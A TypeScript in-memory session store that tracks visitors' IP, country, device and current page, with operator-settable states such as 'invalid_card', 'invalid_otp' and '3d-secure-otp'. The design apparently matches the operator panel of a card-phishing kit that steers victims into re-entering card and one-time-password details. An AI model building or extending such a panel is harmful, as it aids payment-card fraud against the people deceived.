// In-memory session store (file system not reliable on Vercel)
// For production, migrate to a database like MongoDB or Firebase

export type UserState = 'invalid_card' | 'invalid_otp' | '3d-secure-otp' | '3d-secure-app' | 'block' | 'normal';

export interface UserSession {
  id: string;
  currentPage: string;
  lastActive: number;
  userState: UserState;
  ip?: string;
  country?: string;
  device?: string;
  browser?: string;
  createdAt?: number;
  isActive?: boolean;
  lastSeen?: number;
}

// In-memory storage
let sessions: Record<string, UserSession> = {};

export const getSession = (id: string): UserSession | undefined => {
  return sessions[id];
};

export const getAllSessions = (): UserSession[] => {
  const now = Date.now();
  const oneHour = 60 * 60 * 1000;
  const inactivityThreshold = 15 * 1000; // 15 seconds for "instant" removal feel
  
  // Clean up sessions
  Object.keys(sessions).forEach(id => {
    const session = sessions[id];
    const timeSinceLastActive = now - session.lastActive;
    
    // Delete if inactive for more than threshold or older than 1 hour
    if (timeSinceLastActive > inactivityThreshold || timeSinceLastActive > oneHour) {
      delete sessions[id];
    }
  });
  
  return Object.values(sessions);
};

export const updateSession = (id: string, data: Partial<Omit<UserSession, 'id'>>): UserSession => {
  const now = Date.now();
  const existingSession = sessions[id];

  if (existingSession) {
    sessions[id] = {
      ...existingSession,
      ...data,
      lastActive: now,
      isActive: true, // Mark as active when updating
    };
  } else {
    sessions[id] = {
      id,
      currentPage: data.currentPage || '/',
      lastActive: now,
      userState: 'normal',
      isActive: true,
      createdAt: now,
      ...data,
    };
  }

  return sessions[id];
};

export const deleteSession = (id: string): void => {
  delete sessions[id];
};

export const setUserState = (sessionId: string, state: UserState): UserSession | undefined => {
  const session = sessions[sessionId];
  if (session) {
    session.userState = state;
    return session;
  }
  return undefined;
};

export const clearUserState = (sessionId: string): UserSession | undefined => {
  const session = sessions[sessionId];
  if (session) {
    session.userState = 'normal';
    return session;
  }
  return undefined;
};
